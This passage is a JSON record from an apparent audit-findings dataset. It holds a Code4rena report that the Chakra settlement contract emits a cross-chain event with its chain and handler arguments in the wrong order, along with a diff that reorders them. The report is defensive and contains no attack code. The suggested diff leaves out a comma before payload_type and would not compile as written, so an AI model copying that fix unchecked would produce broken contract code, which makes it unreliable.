);\n}\n```\n\nAs shown above, the `receive_cross_chain_msg` function incorrectly sets the arguments in the `CrossChainHandleResult` event. When Chakra validators capture this event and use it to call `receive_cross_chain_callback` on the source chain, the wrong values are passed to the function. For instance, the `from_chain` argument in the event emission in `receive_cross_chain_callback` ends up referring to the source chain itself, rather than the intended destination chain that handled the receive message.\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nEnsure that the arguments in the `CrossChainHandleResult` event are correctly ordered:\n ```diff\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n-       contract_chain_name,\n-       from_chain,\n-       address(to_handler),\n-       from_handler,\n+       from_chain,\n+       contract_chain_name,\n+       from_handler,\n+       address(to_handler)\n       payload_type\n\n    );\n}\n```\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\nWhen a cross-chain ERC20 transfer is initiated, the destination `ChakraSettlement` contract processes the message via the `receive_cross_chain_msg` function and emits a `CrossChainHandleResult` event. This event is crucial for Chakra validators, as they rely on its arguments to correctly call `ChakraSettlement::receive_cross_chain_callback` on the source chain to finalize the message.\n\nThe issue lies in the incorrect ordering of arguments in the `CrossChainHandleResult` event. This misordering causes the validators to pass incorrect values to the `receive_cross_chain_callback` function, leading to improper message finalization:\n```solidity\n// cross chain handle result emit by receive side\nevent CrossChainHandleResult(\n    uint256 indexed txid,\n    CrossChainMsgStatus status,\n    string from_chain,\n    string to_chain,\n    address from_handler,\n    uint256 to_handler,\n    PayloadType payload_type\n);\n\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n>>>        contract_chain_name, // @audit this should be `from_chain`\n>>>        from_chain,          // @audit this should be `contract_chain_name`\n>>>        address(to_handler), // @audit this should be `from_handler`\n>>>        from_handler,        // @audit this should be `to_handler`\n        payload_type\n    );\n}\n```\n\nAs shown above, the `receive_cross_chain_msg` function incorrectly sets the arguments in the `CrossChainHandleResult` event. When Chakra validators capture this event and use it to call `receive_cross_chain_callback` on the source chain, the wrong values are passed to the function. For instance, the `from_chain` argument in the event emission in `receive_cross_chain_callback` ends up referring to the source chain itself, rather than the intended destination chain that handled the receive message.\n", "recommendation_md": "## Recommended Mitigation Steps\nEnsure that the arguments in the `CrossChainHandleResult` event are correctly ordered:\n ```diff\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n-       contract_chain_name,\n-       from_chain,\n-       address(to_handler),\n-       from_handler,\n+       from_chain,\n+       contract_chain_name,\n+       from_handler,\n+       address(to_handler)\n       payload_type\n\n    );\n}\n```\n\n\n## Assessed type\n\nOther\n", "poc_md": null, "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L238-L241\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L238-L241\n\n\n# Vulnerability details\n\n## Impact\nWhen a cross-chain ERC20 transfer is initiated, the destination `ChakraSettlement` contract processes the message via the `receive_cross_chain_msg` function and emits a `CrossChainHandleResult` event. This event is crucial for Chakra validators, as they rely on its arguments to correctly call `ChakraSettlement::receive_cross_chain_callback` on the source chain to finalize the message.\n\nThe issue lies in the incorrect ordering of arguments in the `CrossChainHandleResult` event. This misordering causes the validators to pass incorrect values to the `receive_cross_chain_callback` function, leading to improper message finalization:\n```solidity\n// cross chain handle result emit by receive side\nevent CrossChainHandleResult(\n    uint256 indexed txid,\n    CrossChainMsgStatus status,\n    string from_chain,\n    string to_chain,\n    address from_handler,\n    uint256 to_handler,\n    PayloadType payload_type\n);\n\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n>>>        contract_chain_name, // @audit this should be `from_chain`\n>>>        from_chain,          // @audit this should be `contract_chain_name`\n>>>        address(to_handler), // @audit this should be `from_handler`\n>>>        from_handler,        // @audit this should be `to_handler`\n        payload_type\n    );\n}\n```\n\nAs shown above, the `receive_cross_chain_msg` function incorrectly sets the arguments in the `CrossChainHandleResult` event. When Chakra validators capture this event and use it to call `receive_cross_chain_callback` on the source chain, the wrong values are passed to the function. For instance, the `from_chain` argument in the event emission in `receive_cross_chain_callback` ends up referring to the source chain itself, rather than the intended destination chain that handled the receive message.\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nEnsure that the arguments in the `CrossChainHandleResult` event are correctly ordered:\n ```diff\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n-       contract_chain_name,\n-       from_chain,\n-       address(to_handler),\n-       from_handler,\n+       from_chain,\n+       contract_chain_name,\n+       from_handler,\n+       address(to_handler)\n       payload_type\n\n    );\n}\n```\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L238-L241\n\n\n# Vulnerability details\n\n## Impact\nWhen a cross-chain ERC20 transfer is initiated, the destination `ChakraSettlement` contract processes the message via the `receive_cross_chain_msg` function and emits a `CrossChainHandleResult` event. This event is crucial for Chakra validators, as they rely on its arguments to correctly call `ChakraSettlement::receive_cross_chain_callback` on the source chain to finalize the message.\n\nThe issue lies in the incorrect ordering of arguments in the `CrossChainHandleResult` event. This misordering causes the validators to pass incorrect values to the `receive_cross_chain_callback` function, leading to improper message finalization:\n```solidity\n// cross chain handle result emit by receive side\nevent CrossChainHandleResult(\n    uint256 indexed txid,\n    CrossChainMsgStatus status,\n    string from_chain,\n    string to_chain,\n    address from_handler,\n    uint256 to_handler,\n    PayloadType payload_type\n);\n\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n>>>        contract_chain_name, // @audit this should be `from_chain`\n>>>        from_chain,          // @audit this should be `contract_chain_name`\n>>>        address(to_handler), // @audit this should be `from_handler`\n>>>        from_handler,        // @audit this should be `to_handler`\n        payload_type\n    );\n}\n```\n\nAs shown above, the `receive_cross_chain_msg` function incorrectly sets the arguments in the `CrossChainHandleResult` event. When Chakra validators capture this event and use it to call `receive_cross_chain_callback` on the source chain, the wrong values are passed to the function. For instance, the `from_chain` argument in the event emission in `receive_cross_chain_callback` ends up referring to the source chain itself, rather than the intended destination chain that handled the receive message.\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nEnsure that the arguments in the `CrossChainHandleResult` event are correctly ordered:\n ```diff\nfunction receive_cross_chain_msg(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_address,\n    uint256 from_handler,\n    address to_handler,\n    PayloadType payload_type,\n    bytes calldata payload,\n    uint8 sign_type, // validators signature type /  multisig or bls sr25519\n    bytes calldata signatures // signature array\n) external {\n    // --SNIP\n\n    emit CrossChainHandleResult(\n        txid,\n        status,\n-       contract_chain_name, \n-       from_chain,          \n-       address(to_handler), \n-       from_handler,    \n+       from_chain,\n+       contract_chain_name,\n+       from_handler,\n+       address(to_handler)    \n       payload_type\n\n    );\n}\n```\n\n\n## Assessed type\n\nOther"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
